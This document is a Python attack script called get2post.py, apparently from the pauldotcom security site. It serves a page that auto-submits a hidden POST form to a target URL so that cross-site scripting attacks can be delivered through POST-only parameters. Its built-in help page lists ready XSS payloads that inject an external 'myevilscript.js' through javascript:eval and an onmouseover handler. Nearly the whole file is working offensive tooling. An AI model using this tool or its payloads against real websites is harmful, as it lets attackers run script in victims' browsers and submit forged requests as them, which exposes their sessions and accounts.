#XSS GET to POST script by mark baggett http://www.pauldotcom.com
#start it like this...    python3 get2post.py
#use it like this...  http://<yourIPaddress>:8080/?target=http://www.targeturl.com&postparam=postvalue&anotherparam=itsvalue&postvariable=itsvalue

import sys
import http.server
import urllib.parse
import re

class XSSWebHandler(http.server.BaseHTTPRequestHandler):
  clientfilter=""
  def do_GET(self):
    self.send_response(200)
    self.end_headers()
    (ignore, ignore, ignore, urlparams, ignore) = urllib.parse.urlsplit(self.path)
    tgturl=re.search("target=(http://[\w.:]+)",urlparams)
    #pdb.set_trace()
    if self.clientfilter and self.client_address[0] != self.clientfilter:
      self.wfile.write(b'<html><body>Go Away.</body></html>')
      return
    if not tgturl:
      self.wfile.write(b'<html><body>You need to specify a target parameter and post parameters.<p>For example:  http://thishost.com?target=http://victim.com/xssvulnerable.php&postparam1=postvalue1<p><p>Notes: These have been useful in the past. <p> Inject into current page without &gt and &lt :javascript:eval("s=document.createElement(\'script\');s.src=\'myevilscript.js\';document.getElementsByTagName(\'head\')[0].appendChild(s)")<p><p> Same thing on a javascript event :onmouseover="s=document.createElement(\'script\');s.src=\'myevilscript.js\';document.getElementsByTagName(\'head\')[0].appendChild(s)"</body></html>')
      return

    self.wfile.write(('<html><body><form name="form1" method="post" id="form1" action="%s">' % tgturl.group(1)).encode('utf-8'))

    params=urlparams.split("&")
    for param in params:
      paramvalue=param.split("=")
      if paramvalue[0] != "target":
        self.wfile.write(('<input type="hidden" name="%s" id="%s" value="%s" />' % (paramvalue[0], paramvalue[0], paramvalue[1])).encode('utf-8'))

    self.wfile.write(b'</form><script>document.form1.submit();</script></body></html>')


def main():
  serverport=8080
  tmpclientfilt=""
  if '-h' in sys.argv:
    print("""Usage:   get2post.py [options] 
 Options:
-p server port     Define a port for the server to listen on.  Default 8080
-c clientip        Filter incoming connections and only allow the specified client to use the tool.
""")
    sys.exit(2)
  for i in range(1,len(sys.argv),1):
    if sys.argv[i] == '-p':
      serverport=int(sys.argv[i+1])
    if sys.argv[i] == '-c':
      tmpclientfilt=sys.argv[i+1]

  server = http.server.HTTPServer(('', serverport), XSSWebHandler)
  XSSWebHandler.clientfilter=tmpclientfilt
  print('XSS Server is Ready..')
  server.serve_forever()

if __name__ == '__main__':
  main()

